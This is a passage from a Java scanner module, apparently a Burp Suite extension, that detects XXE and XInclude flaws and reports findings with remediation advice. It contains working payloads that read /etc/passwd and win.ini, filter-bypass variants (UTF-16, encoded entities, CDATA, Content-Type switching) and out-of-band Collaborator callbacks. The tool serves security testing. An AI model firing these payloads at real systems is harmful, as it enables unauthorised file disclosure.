                    java.nio.charset.StandardCharsets.UTF_16LE, "utf-16le");
            perHostDelay();
        }

        // UTF-16 BE with BOM — Linux target
        if (testLinux) {
            testUtf16Payload(original, url, baselineBody, linuxFile, linuxEvidence,
                    "UTF-16 BE", "Linux",
                    new byte[]{(byte) 0xFE, (byte) 0xFF},
                    java.nio.charset.StandardCharsets.UTF_16BE, "utf-16be");
            perHostDelay();
        }

        // UTF-16 LE with BOM — Windows target
        if (testWindows) {
            testUtf16Payload(original, url, baselineBody, winFile, winEvidence,
                    "UTF-16 LE", "Windows",
                    new byte[]{(byte) 0xFF, (byte) 0xFE},
                    java.nio.charset.StandardCharsets.UTF_16LE, "utf-16le");
            perHostDelay();
        }

        // UTF-16 OOB variant (blind) — uses Collaborator if standard UTF-16 didn't yield results
        if (collaboratorManager != null && collaboratorManager.isAvailable()) {
            AtomicReference<HttpRequestResponse> sentUtf16Oob = new AtomicReference<>();
            String collabPayload = collaboratorManager.generatePayload(
                    "xxe-scanner", url, "xml_body", "XXE OOB via UTF-16 encoding bypass",
                    interaction -> reportOobFinding(interaction, url,
                            "UTF-16 encoding bypass OOB", sentUtf16Oob.get()));
            if (collabPayload != null) {
                String oobXml = "<?xml version=\"1.0\" encoding=\"UTF-16LE\"?>\n"
                        + "<!DOCTYPE foo [\n"
                        + "  <!ENTITY % xxe SYSTEM \"http://" + collabPayload + "/xxe\">\n"
                        + "  %xxe;\n"
                        + "]>\n"
                        + "<foo>test</foo>";
                try {
                    byte[] bom = {(byte) 0xFF, (byte) 0xFE};
                    byte[] xmlBytes = oobXml.getBytes(java.nio.charset.StandardCharsets.UTF_16LE);
                    byte[] payload = new byte[bom.length + xmlBytes.length];
                    System.arraycopy(bom, 0, payload, 0, bom.length);
                    System.arraycopy(xmlBytes, 0, payload, bom.length, xmlBytes.length);

                    HttpRequest modified = original.request()
                            .withRemovedHeader("Content-Type")
                            .withAddedHeader("Content-Type", "application/xml; charset=utf-16le")
                            .withBody(ByteArray.byteArray(payload));
                    HttpRequestResponse result = api.http().sendRequest(modified);
                    sentUtf16Oob.set(result);
                } catch (Exception e) {
                    api.logging().logToError("[XXE] UTF-16 OOB test error: " + e.getMessage());
                }
            }
            perHostDelay();
        }
    }

    /**
     * Sends a single UTF-16 encoded XXE file-read payload and checks for evidence.
     */
    private void testUtf16Payload(HttpRequestResponse original, String url,
                                   String baselineBody, String filePath,
                                   Pattern evidencePattern, String encoding,
                                   String osType, byte[] bom,
                                   java.nio.charset.Charset charset, String charsetName) {
        String xxeXml = "<?xml version=\"1.0\" encoding=\"" + charsetName.toUpperCase() + "\"?>\n"
                + "<!DOCTYPE foo [\n"
                + "  <!ENTITY xxe SYSTEM \"file://" + filePath + "\">\n"
                + "]>\n"
                + "<foo>&xxe;</foo>";
        try {
            byte[] xmlBytes = xxeXml.getBytes(charset);
            byte[] payload = new byte[bom.length + xmlBytes.length];
            System.arraycopy(bom, 0, payload, 0, bom.length);
            System.arraycopy(xmlBytes, 0, payload, bom.length, xmlBytes.length);

            HttpRequest modified = original.request()
                    .withRemovedHeader("Content-Type")
                    .withAddedHeader("Content-Type", "application/xml; charset=" + charsetName)
                    .withBody(ByteArray.byteArray(payload));
            HttpRequestResponse result = api.http().sendRequest(modified);

            if (result != null && result.response() != null) {
                String responseBody = result.response().bodyToString();
                if (responseBody != null
                        && evidencePattern.matcher(responseBody).find()
                        && !evidencePattern.matcher(baselineBody).find()) {
                    findingsStore.addFinding(Finding.builder("xxe-scanner",
                                    "XXE via " + encoding + " Encoding Bypass: " + filePath + " (" + osType + ")",
                                    Severity.CRITICAL, Confidence.CERTAIN)
                            .url(url).parameter("xml_body (" + encoding + ")")
                            .evidence(encoding + " encoded XXE payload bypassed filters and read " + filePath)
                            .description("XXE injection confirmed using " + encoding + " encoding. The XML "
                                    + "parser honored the " + encoding + " encoding declaration, bypassing "
                                    + "any input filters that only inspect UTF-8 content. "
                                    + "Remediation: Normalize XML encoding before parsing. Disable external entities.")
                            .requestResponse(result)
                            .build());
                }
            }
        } catch (Exception e) {
            api.logging().logToError("[XXE] " + encoding + " " + osType + " test error: " + e.getMessage());
        }
    }

    // ==================== PHASE 1e: DOUBLE-ENCODED ENTITY BYPASS ====================

    /**
     * Tests XXE payloads using double-encoded and alternative entity syntax to bypass
     * WAFs that filter standard DTD patterns. Techniques:
     *   - HTML entity encoding of % in parameter entities (&#x25; = %)
     *   - CDATA wrapping to hide entity references from output filters
     *   - Nested entity definitions (entity-within-entity)
     * Uses fingerprint to choose the right file target. All findings require
     * confirmed file content with baseline comparison to prevent false positives.
     */
    private void testDoubleEncodedBypass(HttpRequestResponse original, String url,
                                          String requestBody, String baselineBody,
                                          TargetFingerprint fingerprint) throws InterruptedException {

        boolean testLinux = fingerprint.os != DetectedOS.WINDOWS;
        boolean testWindows = fingerprint.os != DetectedOS.LINUX;

        // Bypass 1: HTML-encoded % in parameter entity (&#x25; = %)
        // Some WAFs block "<!ENTITY %" but allow the HTML-encoded form
        if (testLinux) {
            String encodedParamEntity = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                    + "<!DOCTYPE foo [\n"
                    + "  <!ENTITY &#x25; xxe SYSTEM \"file:///etc/passwd\">\n"
                    + "  &#x25;xxe;\n"
                    + "]>\n"
                    + "<foo>test</foo>";

            HttpRequestResponse result1 = sendRawRequest(original, encodedParamEntity);
            if (result1 != null && result1.response() != null) {
                String body = result1.response().bodyToString();
                if (body != null && LINUX_PASSWD_EVIDENCE.matcher(body).find()
                        && !LINUX_PASSWD_EVIDENCE.matcher(baselineBody).find()) {
                    findingsStore.addFinding(Finding.builder("xxe-scanner",
                                    "XXE via HTML-Encoded Parameter Entity Bypass: /etc/passwd read",
                                    Severity.CRITICAL, Confidence.CERTAIN)
                            .url(url).parameter("xml_body (encoded &#x25;)")
                            .evidence("HTML-encoded &#x25; parameter entity bypassed filters — /etc/passwd read")
                            .description("XXE injection confirmed using HTML entity encoding of the % character "
                                    + "in parameter entity declarations (&#x25;). This bypasses WAFs that block "
                                    + "literal '<!ENTITY %' patterns. "
                                    + "Remediation: Disable DTD processing entirely instead of relying on pattern matching.")
                            .requestResponse(result1)
                            .build());
                    return; // confirmed, skip further bypass tests
                }
            }
            perHostDelay();
        }

        // Bypass 2: CDATA section wrapping to hide entity expansion from output filters
        if (testLinux) {
            String cdataBypass = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                    + "<!DOCTYPE foo [\n"
                    + "  <!ENTITY start \"<![CDATA[\">\n"
                    + "  <!ENTITY end \"]]>\">\n"
                    + "  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n"
                    + "]>\n"
                    + "<foo>&start;&xxe;&end;</foo>";

            HttpRequestResponse result2 = sendRawRequest(original, cdataBypass);
            if (result2 != null && result2.response() != null) {
                String body = result2.response().bodyToString();
                if (body != null && LINUX_PASSWD_EVIDENCE.matcher(body).find()
                        && !LINUX_PASSWD_EVIDENCE.matcher(baselineBody).find()) {
                    findingsStore.addFinding(Finding.builder("xxe-scanner",
                                    "XXE via CDATA Wrapping Bypass: /etc/passwd read",
                                    Severity.CRITICAL, Confidence.CERTAIN)
                            .url(url).parameter("xml_body (CDATA)")
                            .evidence("CDATA-wrapped entity references bypassed content filters — /etc/passwd read")
                            .description("XXE injection confirmed using CDATA section wrapping around entity "
                                    + "references. This evades output encoding and content inspection. "
                                    + "Remediation: Disable external entity processing in the XML parser.")
                            .requestResponse(result2)
                            .build());
                    return;
                }
            }
            perHostDelay();
        }

        // Bypass 3: Nested entity definition (entity defined via another entity)
        if (testLinux) {
            String nestedEntity = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                    + "<!DOCTYPE foo [\n"
                    + "  <!ENTITY % a \"<!ENTITY &#x25; b SYSTEM 'file:///etc/passwd'>\">\n"
                    + "  %a;\n"
                    + "  %b;\n"
                    + "]>\n"
                    + "<foo>test</foo>";

            HttpRequestResponse result3 = sendRawRequest(original, nestedEntity);
            if (result3 != null && result3.response() != null) {
                String body = result3.response().bodyToString();
                if (body != null) {
                    boolean hasPasswd = LINUX_PASSWD_EVIDENCE.matcher(body).find()
                            && !LINUX_PASSWD_EVIDENCE.matcher(baselineBody).find();
                    boolean hasDtdError = DTD_PROCESSING_ERROR_PATTERN.matcher(body).find()
                            && !DTD_PROCESSING_ERROR_PATTERN.matcher(baselineBody).find();

                    if (hasPasswd) {
                        findingsStore.addFinding(Finding.builder("xxe-scanner",
                                        "XXE via Nested Entity Bypass: /etc/passwd read",
                                        Severity.CRITICAL, Confidence.CERTAIN)
                                .url(url).parameter("xml_body (nested entities)")
                                .evidence("Nested entity definition bypass succeeded — /etc/passwd content returned")
                                .description("XXE injection confirmed via nested parameter entity definitions. "
                                        + "Remediation: Disable DTD processing entirely.")
                                .requestResponse(result3)
                                .build());
                        return;
                    } else if (hasDtdError) {
                        findingsStore.addFinding(Finding.builder("xxe-scanner",
                                        "XXE Nested Entity Processing Detected",
                                        Severity.HIGH, Confidence.FIRM)
                                .url(url).parameter("xml_body (nested entities)")
                                .evidence("Nested entity definitions triggered DTD processing errors not in baseline")
                                .description("The XML parser attempted to process nested parameter entity "
                                        + "definitions, confirming DTD processing is active. While file content "
                                        + "was not directly returned, this confirms the parser is vulnerable. "
                                        + "Remediation: Disable DTD processing entirely.")
                                .requestResponse(result3)
                                .build());
                    }
                }
            }
            perHostDelay();
        }

        // Bypass 4: Windows targets with text/xml Content-Type bypass
        if (testWindows) {
            String winEntity = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                    + "<!DOCTYPE foo [\n"
                    + "  <!ENTITY xxe SYSTEM \"file:///C:/Windows/win.ini\">\n"
                    + "]>\n"
                    + "<foo>&xxe;</foo>";

            HttpRequest winBypassReq = original.request()
                    .withRemovedHeader("Content-Type")
                    .withAddedHeader("Content-Type", "text/xml")
                    .withBody(winEntity);
            try {
                HttpRequestResponse result4 = api.http().sendRequest(winBypassReq);
                if (result4 != null && result4.response() != null) {
                    String body = result4.response().bodyToString();
                    if (body != null && WINDOWS_WIN_INI_EVIDENCE.matcher(body).find()
                            && !WINDOWS_WIN_INI_EVIDENCE.matcher(baselineBody).find()) {
                        findingsStore.addFinding(Finding.builder("xxe-scanner",
                                        "XXE via Content-Type text/xml Bypass: win.ini read",
                                        Severity.CRITICAL, Confidence.CERTAIN)
                                .url(url).parameter("xml_body (text/xml)")
                                .evidence("text/xml Content-Type bypass succeeded — win.ini content returned")
                                .description("XXE injection confirmed using text/xml Content-Type header. "
                                        + "The server accepted XML via text/xml even though the original "
                                        + "Content-Type may have been application/xml. "
                                        + "Remediation: Enforce strict Content-Type validation and disable external entities.")
                                .requestResponse(result4)
                                .build());
                    }
                }
            } catch (Exception e) {
                api.logging().logToError("[XXE] Content-Type bypass test error: " + e.getMessage());
            }
            perHostDelay();
        }

        // Bypass 5: HTML-encoded % for Windows target
        if (testWindows) {
            String encodedWinEntity = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                    + "<!DOCTYPE foo [\n"
                    + "  <!ENTITY &#x25; xxe SYSTEM \"file:///C:/Windows/win.ini\">\n"
                    + "  &#x25;xxe;\n"
                    + "]>\n"
                    + "<foo>test</foo>";

            HttpRequestResponse result5 = sendRawRequest(original, encodedWinEntity);
            if (result5 != null && result5.response() != null) {
                String body = result5.response().bodyToString();
                if (body != null && WINDOWS_WIN_INI_EVIDENCE.matcher(body).find()
                        && !WINDOWS_WIN_INI_EVIDENCE.matcher(baselineBody).find()) {
                    findingsStore.addFinding(Finding.builder("xxe-scanner",
                                    "XXE via HTML-Encoded Parameter Entity Bypass: win.ini read",
                                    Severity.CRITICAL, Confidence.CERTAIN)
                            .url(url).parameter("xml_body (encoded &#x25;)")
                            .evidence("HTML-encoded &#x25; parameter entity bypass — win.ini content returned")
                            .description("XXE injection confirmed using HTML entity encoding of % on a Windows "
                                    + "target. Remediation: Disable DTD processing entirely.")
                            .requestResponse(result5)
                            .build());
                }
            }
            perHostDelay();
        }
    }

    // ==================== PHASE 2: XINCLUDE INJECTION ====================

    /**
     * Tests XInclude injection in individual parameters. This targets scenarios where
     * user input is embedded into server-side XML documents. The parameters themselves
     * may not be XML, but the server inserts them into an XML context.
     */
    private void testXInclude(HttpRequestResponse original, XxeTarget target,
                               String url) throws InterruptedException {

        // Get baseline for comparison
        HttpRequestResponse baseline = sendPayload(original, target, target.originalValue);
        String baselineBody = (baseline != null && baseline.response() != null)
                ? baseline.response().bodyToString() : "";

        // XInclude payload targeting /etc/passwd (Linux)
        String xincludePasswd = "<xi:include xmlns:xi=\"http://www.w3.org/2001/XInclude\" "
                + "parse=\"text\" href=\"file:///etc/passwd\"/>";
        HttpRequestResponse passwdResult = sendPayload(original, target, xincludePasswd);
        if (passwdResult != null && passwdResult.response() != null) {
            String body = passwdResult.response().bodyToString();
            if (body != null
                    && LINUX_PASSWD_EVIDENCE.matcher(body).find()
                    && !LINUX_PASSWD_EVIDENCE.matcher(baselineBody).find()) {
                findingsStore.addFinding(Finding.builder("xxe-scanner",
                                "XXE via XInclude: /etc/passwd read",
                                Severity.CRITICAL, Confidence.CERTAIN)
                        .url(url).parameter(target.name)
                        .evidence("XInclude payload returned /etc/passwd content (root:x:0:0: found)")
                        .description("XInclude injection confirmed in parameter '" + target.name + "'. "
                                + "The server embeds user input into XML and processes XInclude directives. "
                                + "The /etc/passwd file was successfully read. "
                                + "Remediation: Disable XInclude processing in the XML parser, "
                                + "or sanitize input before embedding it into XML.")
                        .requestResponse(passwdResult)
                        .build());
                return;
            }
        }

        perHostDelay();

        // XInclude payload targeting win.ini (Windows)
        String xincludeWinIni = "<xi:include xmlns:xi=\"http://www.w3.org/2001/XInclude\" "
                + "parse=\"text\" href=\"file:///C:/Windows/win.ini\"/>";
        HttpRequestResponse winIniResult = sendPayload(original, target, xincludeWinIni);
        if (winIniResult != null && winIniResult.response() != null) {
            String body = winIniResult.response().bodyToString();
            if (body != null
                    && WINDOWS_WIN_INI_EVIDENCE.matcher(body).find()
                    && !WINDOWS_WIN_INI_EVIDENCE.matcher(baselineBody).find()) {
                findingsStore.addFinding(Finding.builder("xxe-scanner",
                                "XXE via XInclude: win.ini read",
                                Severity.CRITICAL, Confidence.CERTAIN)
                        .url(url).parameter(target.name)
                        .evidence("XInclude payload returned win.ini content ([fonts] found)")
                        .description("XInclude injection confirmed in parameter '" + target.name + "'. "
                                + "The server embeds user input into XML and processes XInclude directives. "
                                + "The Windows win.ini file was successfully read. "
                                + "Remediation: Disable XInclude processing in the XML parser.")
                        .requestResponse(winIniResult)
                        .build());
                return;
            }
        }

        perHostDelay();

        // XInclude OOB via Collaborator (blind XInclude)
        if (collaboratorManager != null && collaboratorManager.isAvailable()) {
            AtomicReference<HttpRequestResponse> sentXIncludeOob = new AtomicReference<>();
            String collabPayload = collaboratorManager.generatePayload(
                    "xxe-scanner", url, target.name, "XInclude OOB callback",
                    interaction -> {
                        findingsStore.addFinding(Finding.builder("xxe-scanner",
                                        "XXE via XInclude Confirmed (Out-of-Band)",
                                        Severity.CRITICAL, Confidence.CERTAIN)
                                .url(url).parameter(target.name)
                                .evidence("XInclude OOB | Collaborator " + interaction.type().name()
                                        + " interaction from " + interaction.clientIp()
                                        + " at " + interaction.timeStamp())
                                .description("Blind XInclude injection confirmed via Burp Collaborator. "
                                        + "The server processed an XInclude directive in parameter '"
                                        + target.name + "' and made an outbound request. "
                                        + "Remediation: Disable XInclude processing in the XML parser.")
                                .requestResponse(sentXIncludeOob.get())
                                .build());
                        api.logging().logToOutput("[XXE XInclude OOB] Confirmed at " + url
                                + " param=" + target.name);
                    });
            if (collabPayload != null) {
                String xincludeOob = "<xi:include xmlns:xi=\"http://www.w3.org/2001/XInclude\" "
                        + "href=\"http://" + collabPayload + "/xinclude\"/>";
                HttpRequestResponse xincludeOobResult = sendPayload(original, target, xincludeOob);
                sentXIncludeOob.set(xincludeOobResult);
                perHostDelay();
            }
        }

        // XInclude with fallback (some parsers require a fallback element)
        String xincludeFallback = "<xi:include xmlns:xi=\"http://www.w3.org/2001/XInclude\" "
                + "parse=\"text\" href=\"file:///etc/passwd\">"
                + "<xi:fallback>XINCLUDE_FALLBACK</xi:fallback>"
                + "</xi:include>";
        HttpRequestResponse fallbackResult = sendPayload(original, target, xincludeFallback);
        if (fallbackResult != null && fallbackResult.response() != null) {
            String body = fallbackResult.response().bodyToString();
            if (body != null) {
                // If we see the file content, confirmed
                if (LINUX_PASSWD_EVIDENCE.matcher(body).find()
                        && !LINUX_PASSWD_EVIDENCE.matcher(baselineBody).find()) {
                    findingsStore.addFinding(Finding.builder("xxe-scanner",
                                    "XXE via XInclude (with fallback): /etc/passwd read",
                                    Severity.CRITICAL, Confidence.CERTAIN)
                            .url(url).parameter(target.name)
                            .evidence("XInclude with fallback returned /etc/passwd content")
                            .description("XInclude injection confirmed with fallback element. "
                                    + "Remediation: Disable XInclude processing.")
                            .requestResponse(fallbackResult)
                            .build());
                    return;
                }
                // If we see the fallback text, the parser processed XInclude but couldn't read the file
                if (body.contains("XINCLUDE_FALLBACK") && !baselineBody.contains("XINCLUDE_FALLBACK")) {
                    findingsStore.addFinding(Finding.builder("xxe-scanner",
                                    "XInclude processing detected (fallback triggered)",
                                    Severity.MEDIUM, Confidence.FIRM)
                            .url(url).parameter(target.name)
                            .evidence("XInclude fallback element content appeared in response")
                            .description("The server processes XInclude directives in parameter '"
                                    + target.name + "'. The file read failed (access denied or wrong OS), "
                                    + "but the fallback was rendered, confirming XInclude support. "
                                    + "Remediation: Disable XInclude processing.")
                            .requestResponse(fallbackResult)
                            .build());
                }
            }
        }

        perHostDelay();
    }

    // ==================== PHASE 3: CONTENT-TYPE CONVERSION (JSON -> XML) ====================

    /**
     * Tests whether a JSON endpoint also accepts XML by converting the JSON body to XML
     * and changing the Content-Type header. If the server accepts XML, XXE payloads are tested.
     */
    private void testContentTypeConversion(HttpRequestResponse original, String url) throws InterruptedException {
        String jsonBody = original.request().bodyToString();
        if (jsonBody == null || jsonBody.trim().isEmpty()) return;

        // Convert JSON to XML
        String xmlBody = convertJsonToXml(jsonBody);
        if (xmlBody == null) return;

        // Try sending the XML body with application/xml content type
        String[] xmlContentTypes = {"application/xml", "text/xml"};

        for (String xmlCt : xmlContentTypes) {
            HttpRequest xmlRequest = original.request()
                    .withRemovedHeader("Content-Type")
                    .withAddedHeader("Content-Type", xmlCt)
                    .withBody(xmlBody);

            HttpRequestResponse xmlResult = null;
            try {
                xmlResult = api.http().sendRequest(xmlRequest);
            } catch (Exception e) {
                continue;
            }
            if (xmlResult == null || xmlResult.response() == null) continue;

            int xmlStatus = xmlResult.response().statusCode();
            String xmlResponseBody = xmlResult.response().bodyToString();

            // If the server returned a 2xx or 4xx (not 415 Unsupported Media Type),
            // the server may accept XML. Check for XML processing indicators.
            if (xmlStatus != 415 && xmlStatus < 500) {
                // Server accepted the XML Content-Type. Now try XXE payloads.
                findingsStore.addFinding(Finding.builder("xxe-scanner",
                                "Content-Type conversion accepted: JSON to XML",
                                Severity.MEDIUM, Confidence.FIRM)
                        .url(url).parameter("Content-Type")
                        .evidence("Original Content-Type: application/json | Converted to: " + xmlCt
                                + " | Response status: " + xmlStatus)
                        .description("The server accepted an XML Content-Type where JSON was expected. "
                                + "This expands the attack surface to include XXE injection. "
                                + "Remediation: Enforce strict Content-Type validation on the server.")
                        .requestResponse(xmlResult)
                        .build());

                // Now test XXE file read via the converted body
                testConvertedXxePayloads(original, url, xmlBody, xmlCt, xmlResponseBody);
                break; // One accepted content type is enough
            }

            perHostDelay();
        }
    }

    /**
     * Tests XXE payloads against a JSON endpoint that accepted XML content type.
     */
    private void testConvertedXxePayloads(HttpRequestResponse original, String url,
                                           String xmlBody, String contentType,
                                           String baselineBody) throws InterruptedException {

        // Classic file read: /etc/passwd
        if (config.getBool("xxe.classic.enabled", true)) {
            String entityName = "xxeconv";
            String xxeDtd = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                    + "<!DOCTYPE root [\n"
                    + "  <!ENTITY " + entityName + " SYSTEM \"file:///etc/passwd\">\n"
                    + "]>\n";
            String xxePayloadBody = xxeDtd + injectEntityReferenceIntoFirstElement(xmlBody, "&" + entityName + ";");

            HttpRequest xxeRequest = original.request()
                    .withRemovedHeader("Content-Type")
                    .withAddedHeader("Content-Type", contentType)
                    .withBody(xxePayloadBody);

            try {
                HttpRequestResponse result = api.http().sendRequest(xxeRequest);
                if (result != null && result.response() != null) {
                    String body = result.response().bodyToString();
                    if (body != null
                            && LINUX_PASSWD_EVIDENCE.matcher(body).find()
                            && (baselineBody == null || !LINUX_PASSWD_EVIDENCE.matcher(baselineBody).find())) {
                        findingsStore.addFinding(Finding.builder("xxe-scanner",
                                        "XXE via Content-Type Conversion: /etc/passwd read",
                                        Severity.CRITICAL, Confidence.CERTAIN)
                                .url(url).parameter("Content-Type conversion")
                                .evidence("JSON endpoint accepted XML; XXE payload read /etc/passwd")
                                .description("XXE injection confirmed via Content-Type conversion. "
                                        + "The JSON endpoint also accepts XML and processes external entities. "
                                        + "/etc/passwd content was returned. "
                                        + "Remediation: Enforce strict Content-Type validation and disable "
                                        + "external entity processing.")
                                .requestResponse(result)
                                .build());
                        return;
                    }
                }
            } catch (Exception ignored) {}

            perHostDelay();

            // Also test Windows file
            String winIniDtd = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                    + "<!DOCTYPE root [\n"
                    + "  <!ENTITY " + entityName + " SYSTEM \"file:///C:/Windows/win.ini\">\n"
                    + "]>\n";
            String winIniPayload = winIniDtd + injectEntityReferenceIntoFirstElement(xmlBody, "&" + entityName + ";");

            HttpRequest winIniRequest = original.request()
                    .withRemovedHeader("Content-Type")
                    .withAddedHeader("Content-Type", contentType)
                    .withBody(winIniPayload);

            try {
                HttpRequestResponse winIniResult = api.http().sendRequest(winIniRequest);
                if (winIniResult != null && winIniResult.response() != null) {
                    String body = winIniResult.response().bodyToString();
                    if (body != null
                            && WINDOWS_WIN_INI_EVIDENCE.matcher(body).find()
                            && (baselineBody == null || !WINDOWS_WIN_INI_EVIDENCE.matcher(baselineBody).find())) {
                        findingsStore.addFinding(Finding.builder("xxe-scanner",
                                        "XXE via Content-Type Conversion: win.ini read",
                                        Severity.CRITICAL, Confidence.CERTAIN)
                                .url(url).parameter("Content-Type conversion")
                                .evidence("JSON endpoint accepted XML; XXE payload read win.ini")
                                .description("XXE injection confirmed via Content-Type conversion. "
                                        + "The JSON endpoint also accepts XML. win.ini content was returned.")
                                .requestResponse(winIniResult)
                                .build());
                        return;
                    }
                }
            } catch (Exception ignored) {}

            perHostDelay();
        }

        // OOB via Collaborator on converted endpoint
        if (config.getBool("xxe.oob.enabled", true)
                && collaboratorManager != null && collaboratorManager.isAvailable()) {
            AtomicReference<HttpRequestResponse> sentCtConvertOob = new AtomicReference<>();
            String collabPayload = collaboratorManager.generatePayload(
                    "xxe-scanner", url, "Content-Type conversion",
                    "XXE OOB via Content-Type conversion",
                    interaction -> {
                        findingsStore.addFinding(Finding.builder("xxe-scanner",
                                        "XXE via Content-Type Conversion Confirmed (Out-of-Band)",
                                        Severity.CRITICAL, Confidence.CERTAIN)
                                .url(url).parameter("Content-Type conversion")
                                .evidence("JSON-to-XML conversion + OOB | Collaborator "
                                        + interaction.type().name() + " interaction from "
                                        + interaction.clientIp())
                                .description("XXE confirmed on a JSON endpoint via Content-Type conversion. "
                                        + "The server accepted XML where JSON was expected and processed "
                                        + "external entities, triggering an OOB callback. "
                                        + "Remediation: Enforce Content-Type validation and disable external entities.")
                                .requestResponse(sentCtConvertOob.get())
                                .build());
                        api.logging().logToOutput("[XXE CT-Convert OOB] Confirmed at " + url);
                    });
            if (collabPayload != null) {
                String oobDtd = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                        + "<!DOCTYPE root [\n"
                        + "  <!ENTITY % xxe SYSTEM \"http://" + collabPayload + "/xxe\">\n"
                        + "  %xxe;\n"
                        + "]>\n";
                String oobPayload = oobDtd + xmlBody;

                HttpRequest oobRequest = original.request()
                        .withRemovedHeader("Content-Type")
                        .withAddedHeader("Content-Type", contentType)
                        .withBody(oobPayload);
                try {
                    HttpRequestResponse ctOobResult = api.http().sendRequest(oobRequest);
                    sentCtConvertOob.set(ctOobResult);
                } catch (Exception ignored) {}
            }

            perHostDelay();
        }
    }

    // ==================== HELPER METHODS ====================

    /**
     * Sends the original request with a replaced body. Preserves all headers including Content-Type.
     */
    private HttpRequestResponse sendRawRequest(HttpRequestResponse original, String newBody) {
        try {
            HttpRequest modified = original.request().withBody(newBody);
            return api.http().sendRequest(modified);
        } catch (Exception e) {
            return null;
        }
    }

    /**
     * Sends a payload by injecting it into the target parameter (for XInclude testing).
     */
    private HttpRequestResponse sendPayload(HttpRequestResponse original, XxeTarget target, String payload) {
        try {
            HttpRequest modified = injectPayload(original.request(), target, payload);
            return api.http().sendRequest(modified);
        } catch (Exception e) {
            return null;
        }
    }

    /**
     * Injects a payload into a parameter based on target type.
     */
    private HttpRequest injectPayload(HttpRequest request, XxeTarget target, String payload) {
        switch (target.type) {
            case QUERY:
                return request.withUpdatedParameters(
                        HttpParameter.urlParameter(target.name,
                                URLEncoder.encode(payload, StandardCharsets.UTF_8)));
            case BODY:
                return request.withUpdatedParameters(
                        HttpParameter.bodyParameter(target.name,
                                URLEncoder.encode(payload, StandardCharsets.UTF_8)));
            case COOKIE:
                return request.withUpdatedParameters(
                        HttpParameter.cookieParameter(target.name, payload));
            case JSON:
                String body = request.bodyToString();
                String escaped = payload.replace("\\", "\\\\").replace("\"", "\\\"");
                // For dot-notation keys (nested JSON), use the leaf key name for matching
                String matchKey = target.name.contains(".") ? target.name : target.name;
                String jsonPattern = "\"" + java.util.regex.Pattern.quote(matchKey)
                        + "\"\\s*:\\s*(?:\"[^\"]*\"|\\d+(?:\\.\\d+)?|true|false|null)";
                String replacement = "\"" + matchKey + "\": \"" + escaped + "\"";
                return request.withBody(body.replaceFirst(jsonPattern, replacement));
            case HEADER:
                return request.withRemovedHeader(target.name).withAddedHeader(target.name, payload);
            default:
                return request;
        }
    }

    /**
     * Injects a DTD prologue into an existing XML body. Handles cases where the body
     * already has an XML declaration and/or an existing DOCTYPE.
     *
     * @param originalXml The original XML body
     * @param dtd         The DTD to inject (e.g., "<!DOCTYPE foo [...]>")
     * @param entityRef   An entity reference to inject into the body content (e.g., "&xxe;"),
     *                    or empty string if not needed
     * @return The modified XML body with the DTD injected
     */
    private String injectDtdIntoXml(String originalXml, String dtd, String entityRef) {
        String result = originalXml;

        // Remove any existing DOCTYPE declaration to avoid conflicts
        result = result.replaceAll("<!DOCTYPE[^>]*>", "");
        result = result.replaceAll("<!DOCTYPE[^\\[]*\\[[^\\]]*\\]\\s*>", "");

        // Remove the XML declaration if present; we will re-add it in the DTD
        String xmlDecl = "";
        Pattern xmlDeclPattern = Pattern.compile("<\\?xml[^?]*\\?>");
        Matcher m = xmlDeclPattern.matcher(result);
        if (m.find()) {
            xmlDecl = m.group();
            result = m.replaceFirst("");
        }

        result = result.trim();

        // Construct: [xml declaration] + [dtd] + [body with optional entity reference]
        StringBuilder sb = new StringBuilder();
        if (!xmlDecl.isEmpty()) {
            sb.append(xmlDecl).append("\n");
        }
        sb.append(dtd);

        // If an entity reference is needed, inject it into the first text content of the XML
        if (!entityRef.isEmpty()) {
            result = injectEntityReferenceIntoFirstElement(result, entityRef);
        }

        sb.append(result);
        return sb.toString();
    }

    /**
     * Injects an entity reference into the first element's text content in the XML.
     * For example, turns "<root><name>John</name></root>" into "<root><name>&xxe;John</name></root>".
     * If no suitable element is found, appends the entity reference after the first opening tag.
     */
    private String injectEntityReferenceIntoFirstElement(String xml, String entityRef) {
        // Try to find the first opening tag and inject the entity reference after it
        Pattern firstElementPattern = Pattern.compile("(<[a-zA-Z][^>]*>)([^<]*)");
        Matcher matcher = firstElementPattern.matcher(xml);
        if (matcher.find()) {
            int insertPos = matcher.start(2);
            return xml.substring(0, insertPos) + entityRef + xml.substring(insertPos);
        }
        // Fallback: just prepend
        return entityRef + xml;
    }

    /**
     * Injects an entity reference into the first text node of a SOAP body element.
     */
    private String injectEntityReferenceIntoSoap(String soapXml, String entityRef) {
        // Try to find SOAP Body content and inject entity reference there
        Pattern soapBodyContentPattern = Pattern.compile(
                "(<(?:soap|SOAP-ENV|soapenv):Body[^>]*>\\s*<[^>]+>)([^<]*)",
                Pattern.CASE_INSENSITIVE);
        Matcher m = soapBodyContentPattern.matcher(soapXml);
        if (m.find()) {
            int insertPos = m.start(2);
            return soapXml.substring(0, insertPos) + entityRef + soapXml.substring(insertPos);
        }
        // Fallback: try general injection
        return injectEntityReferenceIntoFirstElement(soapXml, entityRef);
    }

    /**
     * Converts a simple JSON object to a basic XML representation.
     * Handles flat JSON objects (nested objects are serialized as string values).
     *
     * @param json The JSON string to convert
     * @return An XML representation, or null if conversion fails
     */
    private String convertJsonToXml(String json) {
        try {
            com.google.gson.JsonElement el = com.google.gson.JsonParser.parseString(json);
            if (!el.isJsonObject()) return null;

            com.google.gson.JsonObject obj = el.getAsJsonObject();
            StringBuilder xml = new StringBuilder();
            xml.append("<root>");

            for (String key : obj.keySet()) {
                // Sanitize key for XML element name (replace invalid chars)
                String safeKey = key.replaceAll("[^a-zA-Z0-9_.-]", "_");
                if (safeKey.isEmpty() || Character.isDigit(safeKey.charAt(0))) {
                    safeKey = "item_" + safeKey;
                }

                com.google.gson.JsonElement val = obj.get(key);
                String textValue;
                if (val.isJsonPrimitive()) {
                    textValue = xmlEscape(val.getAsString());
                } else if (val.isJsonNull()) {
                    textValue = "";
                } else {
                    textValue = xmlEscape(val.toString());
                }
